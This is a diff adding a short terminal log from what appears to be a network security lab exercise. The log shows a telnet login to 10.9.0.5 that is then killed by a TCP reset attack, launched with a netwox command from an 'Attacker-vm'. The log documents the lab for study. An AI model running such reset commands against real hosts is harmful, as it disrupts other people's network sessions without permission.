@@ -1,0 +1,25 @@
+root@d5c1ac18ddb9:/# telnet 10.9.0.5
+Trying 10.9.0.5...
+Connected to 10.9.0.5.
+Escape character is '^]'.
+Ubuntu 20.04.1 LTS
+58a9ed39547c login: seed
+Password: 
+Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.11.0-1029-gcp x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Sun Feb 13 08:28:00 UTC 2022 from user1-10.9.0.6.net-10.9.0.0 on pts/2
+seed@58a9ed39547c:~$ 
+
+[02/14/22]admin@Attacker-vm:~/.../Labsetup$ sudo netwox 78 -d "br-3e5f42528ad9" -f "dst host 10.9.0.5 and dst port 23"
+
+seed@58a9ed39547c:~$ lsConnection closed by foreign host.
+root@d5c1ac18ddb9:/# 
+
